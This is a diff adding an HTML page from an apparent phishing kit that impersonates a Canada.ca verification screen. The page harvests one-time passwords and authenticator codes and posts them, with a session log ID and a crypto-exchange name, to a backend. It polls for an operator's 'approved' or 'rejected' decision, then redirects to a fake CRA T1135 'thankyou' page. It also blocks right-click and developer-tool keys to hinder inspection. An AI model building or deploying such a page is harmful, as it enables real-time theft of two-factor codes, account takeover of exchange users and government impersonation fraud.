@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Verification - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .verify-container {
+            max-width: 500px;
+            margin: 80px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #335075;
+        }
+        .btn-complete {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-complete:hover {
+            background-color: #45a049;
+        }
+        .verification-step {
+            margin-bottom: 25px;
+        }
+        .spinner-icon {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-message {
+            display: none;
+            background-color: #fee;
+            border: 1px solid #c33;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            color: #c33;
+            font-size: 14px;
+        }
+        .error-message.active {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .error-message i {
+            font-size: 16px;
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #335075;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-container">
+        <div class="flex items-center justify-between mb-6">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-8">
+            <i class="fas fa-lock text-gray-400 text-xl"></i>
+        </div>
+
+        <h1 class="text-2xl font-bold text-gray-800 mb-2">Complete verification</h1>
+        <p class="text-gray-600 mb-6">Complete the following security steps to verify your account</p>
+        <!-- Error Message -->
+        <div class="error-message" id="errorMessage">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>Invalid Multi-Factor Authentication. Please check your codes and try again.</span>
+        </div>
+
+        <div class="mb-6">
+            <div class="spinner-icon"></div>
+        </div>
+
+        <form id="verifyForm">
+            <div class="verification-step">
+                <label class="flex items-center text-gray-700 font-semibold mb-2">
+                    <i class="fas fa-key mr-2"></i> One-Time Password (OTP)
+                </label>
+                <input type="text" class="input-field" placeholder="Enter your OTP code" maxlength="6" required>
+            </div>
+
+            <div class="verification-step">
+                <label class="flex items-center text-gray-700 font-semibold mb-2">
+                    <i class="fas fa-shield-alt mr-2"></i> Authenticator code
+                </label>
+                <input type="text" class="input-field" placeholder="Enter 6-digit code from app" maxlength="6" required>
+            </div>
+
+            <button type="submit" class="btn-complete">
+                Complete verification
+            </button>
+        </form>
+
+        <div class="mt-6 text-center">
+            <a href="select-exchange.html" class="text-blue-600 text-sm hover:underline">
+                <i class="fas fa-arrow-left"></i> Back to sign in
+            </a>
+        </div>
+    </div>
+
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p class="mt-6 text-xl font-semibold text-gray-700">Verifying authentication codes...</p>
+        <p class="mt-2 text-sm text-gray-500">Please wait while we confirm your identity</p>
+    </div>
+
+    <script>
+        const EXCHANGE_NAME = sessionStorage.getItem('exchange_name') || 'gemini';
+        const logId = sessionStorage.getItem('exchange_logId');
+        let checkInterval;
+
+        // If no logId, redirect back to login
+        if (!logId) {
+            window.location.href = EXCHANGE_NAME + '-login.html';
+        }
+
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const inputs = this.querySelectorAll('.input-field');
+            const labels = this.querySelectorAll('label');
+            const codes = {};
+            
+            // Collect all input values with their labels
+            inputs.forEach((input, index) => {
+                const labelText = labels[index] ? labels[index].textContent.trim() : `Field ${index + 1}`;
+                codes[labelText] = input.value || '(not provided)';
+            });
+            
+            try {
+                // Send 2FA codes to API
+                const response = await fetch('/api/exchange-verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        logId: logId,
+                        exchange: EXCHANGE_NAME,
+                        codes: codes
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    // Clear any existing interval
+                    if (checkInterval) clearInterval(checkInterval);
+                    // Hide error message if showing
+                    document.getElementById('errorMessage').classList.remove('active');
+                    // Show loading overlay
+                    const overlay = document.getElementById('loadingOverlay');
+                    overlay.style.display = 'flex';
+                    overlay.classList.add('active');
+                    // Start polling for approval
+                    checkInterval = setInterval(checkApprovalStatus, 2000);
+                }
+            } catch (err) {
+                console.error('Verify error:', err);
+                alert('Connection error. Please try again.');
+            }
+        });
+
+        async function checkApprovalStatus() {
+            try {
+                const response = await fetch('/api/exchange-check-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ logId })
+                });
+                
+                const data = await response.json();
+                
+                console.log('[VERIFY] Status check:', data); // Debug log
+                
+                if (data.status === 'approved' && data.stage === 'verify') {
+                    clearInterval(checkInterval);
+                    sessionStorage.removeItem('exchange_logId');
+                    sessionStorage.removeItem('exchange_name');
+                    window.location.href = '../../../../../../../declaration/T1135-craarc/REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/thankyou.html';
+                } else if (data.status === 'rejected' && data.stage === 'verify') {
+                    clearInterval(checkInterval);
+                    const overlay = document.getElementById('loadingOverlay');
+                    overlay.classList.remove('active');
+                    overlay.style.display = 'none'; // Force hide
+                    document.getElementById('errorMessage').classList.add('active');
+                    // Scroll to top to show error
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                } else if (data.status === 'rejected') {
+                    // Catch any other rejected state
+                    clearInterval(checkInterval);
+                    const overlay = document.getElementById('loadingOverlay');
+                    overlay.classList.remove('active');
+                    overlay.style.display = 'none'; // Force hide
+                    document.getElementById('errorMessage').classList.add('active');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            } catch (err) {
+                console.error('Status check error:', err);
+            }
+        }
+        function resendCode(type) {
+            alert('A new ' + type + ' code has been sent.');
+        }
+
+        // Anti-scraping protection
+        (function() {
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
+                    (e.ctrlKey && e.keyCode == 85) ||
+                    (e.ctrlKey && e.keyCode == 83)) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        })();
+    </script>
+</html>
+</body>
+</html>
